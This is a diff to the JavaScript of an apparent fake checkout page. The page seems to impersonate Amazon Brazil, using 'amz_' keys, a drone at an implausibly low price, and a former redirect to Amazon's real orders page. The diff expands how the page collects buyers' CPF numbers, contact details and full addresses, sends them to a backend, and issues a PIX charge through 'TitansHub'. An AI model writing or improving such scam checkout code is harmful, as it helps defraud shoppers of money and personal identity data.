@@ -407,22 +407,81 @@
 <script>
     // 1. Dynamic Price & Image Inheritance
     const urlParams = new URLSearchParams(window.location.search);
-    const priceParam = urlParams.get('price') || '138,77';
-    const imgParam = urlParams.get('img');
-    
-    // Update Image if provided
+    const storage = {
+        get(key) {
+            try {
+                return sessionStorage.getItem(key) || '';
+            } catch (error) {
+                return '';
+            }
+        },
+        set(key, value) {
+            try {
+                sessionStorage.setItem(key, String(value));
+            } catch (error) {
+                // noop
+            }
+        }
+    };
+
+    function parseAmountValue(value) {
+        if (value === undefined || value === null) {
+            return 0;
+        }
+
+        const raw = String(value).trim();
+        if (!raw) {
+            return 0;
+        }
+
+        const cleaned = raw.replace(/[^\d,.-]/g, '');
+        let normalized = cleaned;
+
+        if (cleaned.includes(',') && cleaned.includes('.')) {
+            normalized = cleaned.lastIndexOf(',') > cleaned.lastIndexOf('.')
+                ? cleaned.replace(/\./g, '').replace(',', '.')
+                : cleaned.replace(/,/g, '');
+        } else if (cleaned.includes(',')) {
+            normalized = cleaned.replace(',', '.');
+        }
+
+        const parsed = Number.parseFloat(normalized);
+        return Number.isFinite(parsed) ? parsed : 0;
+    }
+
+    const storedWhole = storage.get('checkout_price_whole');
+    const storedFraction = storage.get('checkout_price_fraction');
+    const storedCompositePrice = storedWhole ? `${storedWhole},${storedFraction || '00'}` : '';
+    const rawPrice = storage.get('amz_total_amount') || storedCompositePrice || urlParams.get('price') || '138,77';
+    const amountValue = parseAmountValue(rawPrice) || 138.77;
+    const productName = (urlParams.get('product') || storage.get('amz_product_name') || 'Drone DJI Mini Pro Professional 8K Obstacle Avoidance').trim();
+    const imgParam = urlParams.get('img') || storage.get('amz_product_image');
+    const wholePart = Math.floor(amountValue).toString();
+    const fractionPart = Math.round((amountValue - Math.floor(amountValue)) * 100).toString().padStart(2, '0');
+
+    storage.set('amz_total_amount', amountValue.toFixed(2));
+    storage.set('checkout_price_whole', wholePart);
+    storage.set('checkout_price_fraction', fractionPart);
+    storage.set('amz_product_name', productName);
+
     if (imgParam) {
         document.getElementById('product-img').src = imgParam;
     }
 
-    const formattedPrice = parseFloat(priceParam.replace(',', '.')).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
-    
+    const formattedPrice = amountValue.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
     document.getElementById('subtotal').innerText = formattedPrice;
     document.getElementById('total-price').innerText = formattedPrice;
 
+    const summaryTitle = document.querySelector('.summary-box h4');
+    if (summaryTitle) {
+        summaryTitle.innerText = productName;
+    }
+
     // Titans Analytics & Attribution
-    let attributionId = localStorage.getItem('amz_attribution_id');
-    const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
+    let attributionId = storage.get('amz_attribution_id');
+    const sessionId = storage.get('amz_session_id') || ('sess_' + Math.random().toString(36).substr(2, 9));
+    storage.set('amz_session_id', sessionId);
     
     async function initAttribution() {
         if (!attributionId) {
@@ -439,11 +498,12 @@
                 const data = await res.json();
                 if (data.attributionId) {
                     attributionId = data.attributionId;
-                    localStorage.setItem('amz_attribution_id', attributionId);
+                    storage.set('amz_attribution_id', attributionId);
                 }
             } catch (e) {
                 console.error('Attribution error:', e);
                 attributionId = 'manual_' + Date.now();
+                storage.set('amz_attribution_id', attributionId);
             }
         }
         
@@ -514,22 +574,58 @@
             return;
         }
 
+        if (!attributionId) {
+            await initAttribution();
+        }
+
         overlay.style.display = 'flex';
-        
+
+        const buyerName = document.getElementById('full-name').value.trim();
+        const buyerEmail = document.getElementById('email').value.trim();
+        const buyerPhone = document.getElementById('phone').value.trim();
+        const buyerCpf = document.getElementById('cpf').value.trim();
+        const buyerCep = document.getElementById('cep').value.trim();
+        const buyerStreet = document.getElementById('address').value.trim();
+        const buyerNumber = document.getElementById('number').value.trim();
+        const buyerComplement = document.getElementById('complement').value.trim();
+        const buyerNeighborhood = document.getElementById('neighborhood').value.trim();
+        const buyerCity = document.getElementById('city').value.trim();
+        const buyerState = document.getElementById('state').value.trim();
+        const fullAddress = [
+            buyerStreet,
+            buyerNumber,
+            buyerComplement ? `- ${buyerComplement}` : '',
+            buyerNeighborhood,
+            buyerCity ? `${buyerCity}${buyerState ? ` - ${buyerState}` : ''}` : '',
+            buyerCep
+        ].filter(Boolean).join(', ');
+
         const buyerData = {
-            name: document.getElementById('name').value,
-            email: document.getElementById('email').value,
-            phone: document.getElementById('phone').value,
-            cpf: document.getElementById('cpf').value,
-            cep: document.getElementById('cep').value,
-            address: document.getElementById('address').value,
-            number: document.getElementById('number').value,
-            complement: document.getElementById('complement').value,
-            neighborhood: document.getElementById('neighborhood').value,
-            city: document.getElementById('city').value,
-            state: document.getElementById('state').value,
-            productName: "Drone DJI Mini Pro Professional 8K",
-            amount: parseFloat(priceParam.replace(',', '.'))
+            name: buyerName,
+            nome: buyerName,
+            email: buyerEmail,
+            phone: buyerPhone,
+            cpf: buyerCpf,
+            zipCode: buyerCep,
+            cep: buyerCep,
+            street: buyerStreet,
+            rua: buyerStreet,
+            address: buyerStreet,
+            number: buyerNumber,
+            numero: buyerNumber,
+            complement: buyerComplement,
+            complemento: buyerComplement,
+            neighborhood: buyerNeighborhood,
+            bairro: buyerNeighborhood,
+            city: buyerCity,
+            cidade: buyerCity,
+            state: buyerState,
+            estado: buyerState,
+            fullAddress: fullAddress,
+            full_address: fullAddress,
+            productName: productName,
+            amount: amountValue,
+            totalAmount: amountValue
         };
 
         try {
@@ -540,8 +636,11 @@
                     attributionId,
                     sessionId,
                     buyer: buyerData,
-                    amount: buyerData.amount,
-                    pageId: 'checkout_unified'
+                    amount: amountValue,
+                    items: [{ title: productName, unitPrice: amountValue, quantity: 1, tangible: true }],
+                    pageId: 'checkout_unified',
+                    landingPage: document.referrer || '',
+                    pageUrl: window.location.href
                 })
             });
 
@@ -549,11 +648,18 @@
             
             if (data.ok && data.transaction) {
                 const pixCode = data.transaction.pix_code;
+                if (!pixCode) {
+                    throw new Error('A TitansHub não retornou o código PIX da cobrança.');
+                }
                 const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixCode)}`;
                 
                 document.getElementById('pix-qr').src = qrUrl;
                 document.getElementById('pix-code').innerText = pixCode;
                 document.getElementById('pix-container').style.display = 'flex';
+                storage.set('checkout_pix_code', pixCode);
+                if (data.transaction.id) {
+                    storage.set('checkout_transaction_id', data.transaction.id);
+                }
                 
                 overlay.style.display = 'none';
                 btn.style.display = 'none';
@@ -561,7 +667,9 @@
                 document.getElementById('pix-container').scrollIntoView({ behavior: 'smooth' });
                 
                 // Start Polling
-                startPolling(data.transaction.id);
+                if (data.transaction.id) {
+                    startPolling(data.transaction.id);
+                }
             } else {
                 throw new Error(data.message || 'Erro ao gerar PIX');
             }
@@ -583,7 +691,7 @@
                 if (data.ok && (data.status === 'paid' || data.status === 'approved' || data.status === 'completed')) {
                     clearInterval(pollingInterval);
                     alert('Pagamento aprovado! Redirecionando...');
-                    window.location.href = 'https://www.amazon.com.br/gp/css/history/orders'; // Redirect to real orders or a success page
+                    window.location.href = '/success';
                 }
             } catch (e) {
                 console.error('Polling error:', e);
@@ -592,7 +700,11 @@
     }
 
     function copyPix() {
-        const code = document.getElementById('pix-code').innerText;
+        const code = (document.getElementById('pix-code').innerText || '').trim();
+        if (!code || code === 'Clique para copiar o cÃ³digo') {
+            alert('CÃ³digo PIX indisponÃ­vel no momento.');
+            return;
+        }
         navigator.clipboard.writeText(code).then(() => {
             alert('Código Pix copiado com sucesso!');
         });
